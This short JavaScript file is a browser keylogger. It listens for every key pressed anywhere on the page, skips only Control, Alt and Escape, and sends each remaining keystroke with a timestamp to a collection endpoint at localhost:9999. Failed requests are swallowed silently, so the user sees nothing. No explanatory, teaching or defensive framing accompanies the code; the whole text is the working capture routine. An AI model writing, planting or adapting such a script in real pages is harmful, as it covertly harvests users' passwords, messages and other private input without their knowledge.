document.addEventListener('keydown', function(event) {
    const key = event.key;

    //忽略按键
    if (['Control', 'Alt', 'Escape'].includes(key)) {
        return;
    }

    const timestamp = new Date().toISOString();
    sendKeyToServer(key, timestamp);
});

function sendKeyToServer(key, timestamp) {
    const params = new URLSearchParams({
        key: key,
        timestamp: timestamp
    });

    fetch(`http://localhost:9999/log_keypress?${params.toString()}`, {
        method: 'GET'
    })
    .catch((error) => {

    });
}
